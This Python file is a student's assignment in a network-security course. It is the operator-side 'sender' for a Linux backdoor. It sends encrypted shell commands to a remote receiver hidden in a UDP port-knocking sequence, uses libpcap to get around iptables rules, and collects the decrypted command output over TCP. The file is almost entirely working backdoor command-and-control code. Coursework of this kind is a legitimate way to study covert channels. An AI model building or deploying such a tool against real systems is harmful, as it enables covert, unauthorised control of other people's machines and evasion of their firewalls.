#!/usr/bin/env python3

"""
----------------------------------------------------------------------------------------------------
COMP 8505 BTech Network Security & Applications Development
Assignment 3:
    - To become familiar with packet sniffing backdoors and to implement Linux backdoors.
Student:
    - Hung Yu (Angus) Lin, A01034410, Set 7J
----------------------------------------------------------------------------------------------------
sender.py
    - Contains sender command line UI send a command hidden in UDP port knocking to receiver backdoor,
      then decrypts the data returned from backdoor and display to user.
----------------------------------------------------------------------------------------------------
"""
import socket as sock
from _thread import *
from scapy.all import *
from scapy.layers.inet import *
import encryption
# Set scapy to use libpcap library to circumvent iptables rules.
from scapy.all import conf
conf.use_pcap = True

LOG_PATH = "log.txt"
CONFIGURATION_PATH = "configuration.txt"


def read_configuration():
    """
    Reads configuration file.
    :return: list (config vars)
    """

    configuration = {
        'receiver_address': '',
        'sender_address': '',
        'receiver_port1': 0,
        'receiver_port2': 0,
        'receiver_port3': 0,
        'sender_port': 0,
        'port_knock_auth': '',
    }

    with open(file=CONFIGURATION_PATH, mode='r', encoding='utf-8') as file:
        fp = [line.rstrip('\n') for line in file]
        for line in fp:
            if line.isspace() or line.startswith('#'):
                continue

            config_data = line.split('=')
            if config_data[0] in configuration:
                if config_data[0] in ('receiver_address', 'sender_address', 'port_knock_auth'):
                    configuration[config_data[0]] = config_data[1]
                elif config_data[0] in ('receiver_port1', 'receiver_port2', 'receiver_port3', 'sender_port'):
                    data = config_data[1]
                    if data.isdigit():
                        configuration[config_data[0]] = int(config_data[1])
                    else:
                        print("Invalid configuration, ports must be integers.")
                        exit()
                else:
                    print("Invalid configuration, unsupported variable detected.")
                    exit()

    return configuration


def start_sender():
    """
    Initializes command line UI for attacker to send shell commands to a backdoor receiver.
    Calls port-knocking and listening for response for each commands sent.
    :return: None
    """
    print("Starting Sender. (Type \"exit\" to shutdown)")

    # Generate encryption key if needed. Ensure both sender and receiver have same key.
    encryption.generate_key()

    # Read Configuration
    config = read_configuration()
    receiver_addr = config['receiver_address']
    port1 = config['receiver_port1']
    port2 = config['receiver_port2']
    port3 = config['receiver_port3']
    # sender_addr = config['sender_address']
    sender_port = config['sender_port']
    port_knock_auth = config['port_knock_auth']

    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    # start_new_thread(data_server, (IPAddr, sender_port))

    keep_going = True
    while keep_going:
        user_input = input("Enter a command to send to backdoor (ie. \"ifconfig\"): ")
        if user_input == "exit":
            print("Sender Shutdown.")
            break

        try:
            encoded_input = user_input.encode("utf-8").decode("utf-8")
        except UnicodeEncodeError or UnicodeDecodeError:
            print("Invalid character detected. Must be UTF-8 supported values only.")
            continue

        # Send command with port-knocking.
        send_port_knock_command(user_input, receiver_addr, port1, port2, port3, port_knock_auth)
        # Listen for backdoor response.
        data_server(IPAddr, sender_port)


def send_port_knock_command(message, receiver_addr, port1, port2, port3, port_knock_auth):
    """
    Performs port-knocking sequence on the receiver backdoor.
    UDP packets are sent with auth_string as payload in order to port 1-3 as specified in config file.
    Command is encrypted and send with final packet in port-knocking sequence.
    :param message: str of shell command
    :param receiver_addr: IP address
    :param port1: int of port
    :param port2: int of port
    :param port3: int of port
    :param port_knock_auth: str used for authentication
    :return: None
    """

    sport = RandShort()
    encrypt_msg = encryption.encrypt(message.encode('utf-8')).decode('utf-8')
    command_payload = port_knock_auth + "|" + encrypt_msg

    # Port-knocking 3 UDP ports with Auth keyword as payload. Include command at end of last packet payload.
    port_knock_1 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port1) / Raw(load=port_knock_auth)
    port_knock_2 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port2) / Raw(load=port_knock_auth)
    port_knock_3 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port3) / Raw(load=command_payload)
    send(port_knock_1, verbose=0)
    send(port_knock_2, verbose=0)
    send(port_knock_3, verbose=0)


def data_server(address, port):
    """
    Creates a socket that listens for a single TCP response from the receiver backdoor.
    Decrypts the data and closes the socket connection.
    :param address: IP address
    :param port: int of port
    :return: None
    """
    with sock.socket(sock.AF_INET, sock.SOCK_STREAM) as IPv4_sock:
        IPv4_sock.setsockopt(sock.SOL_SOCKET, sock.SO_REUSEADDR, 1)
        IPv4_sock.bind((address, port))
        IPv4_sock.listen(10)
        # print("Listening on: ", IPv4_sock.getsockname())

        # while True:
        conn, addr = IPv4_sock.accept()

        data_full = ''
        while True:
            data = conn.recv(1024).decode('utf-8')
            if data:
                data_full += data
            else:
                conn.close()
                break
        print(f"Encrypted Data: {data_full}")
        decrypted_data = encryption.decrypt(data_full.encode('utf-8')).decode('utf-8')
        print(f"Data: {decrypted_data}")


if __name__ == "__main__":
    try:
        start_sender()
    except KeyboardInterrupt as e:
        print("Sender Shutdown")
        exit()


